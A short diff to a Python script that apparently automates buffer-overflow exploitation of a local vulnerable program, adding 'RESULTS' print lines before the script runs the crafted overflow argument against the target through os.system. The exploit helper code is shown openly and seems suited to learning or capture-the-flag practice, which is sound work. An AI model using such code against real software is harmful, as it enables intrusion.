@@ -55,6 +55,7 @@ def explotationFloat():
 	exploit2 = "'"+stri2+"'"
 	print('\t',exploit2)
 	print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
+	print("[+] RESULTS:")
 	os.system('./%s $(python -c "print(%s*%s+%s)")'%(vulnapp, exploit1,int(chunkbytes)-1, exploit2))
 
 def explotationInteger():
@@ -64,6 +65,7 @@ def explotationInteger():
 	exploit1 = "'"+stri1+"'"
 	print('\t',exploit1)
 	print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
+	print("[+] RESULTS:")
 	os.system('./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
 
 if type(divide) == float:
